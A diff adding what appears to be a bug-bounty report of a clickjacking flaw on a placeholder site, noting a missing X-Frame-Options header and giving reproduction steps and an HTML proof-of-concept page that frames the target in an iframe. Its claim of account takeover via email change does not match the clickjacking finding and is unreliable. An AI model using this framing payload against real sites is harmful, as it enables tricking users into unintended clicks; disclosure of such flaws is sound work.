@@ -1,0 +1,33 @@
+TITLE: CLICKJACKING vulnerability in xyz website 
+AFFECTED WEBSITE: https://xyz.com
+
+VULNERABILITY TYPEDETAILS:The attacker can change the email in the new user request which leads to entire account take over.
+
+Summary:Clickjacking (User Interface redress attack, UI redress attack, UI redressing) is a malicious technique of tricking a Web user into clicking on something different from what the user perceives they are clicking on.The server didn't return an X-Frame-Options header which means that this website could be at risk of a clickjacking attack. The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <frame> or <iframe>. Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites.This vulnerability affects Web Server.
+
+Steps To Reproduce:
+1. Go to https://xyz.com
+2. Copy the url and paste it in the PAYLOAD.
+3. Open the responce in the browser.
+
+PAYLOAD:
+<!DOCTYPE html>
+<html>
+<head>	
+<title>]VISHWAS_C[</title>
+</head>
+<body style="background-color: black">
+<p><font color="aqua">
+<center> Website is vulnerable to </center>
+</br> 
+<center>CLICK JACKING</center>
+</font>
+</p>
+<p><strong><marquee> <font color="red">for more details contact 6360091227 </font></marquee></strong>
+</p><iframe src="https://xyz.com" width="1300" height="700"></iframe>
+</body>
+</html>
+
+
+
+
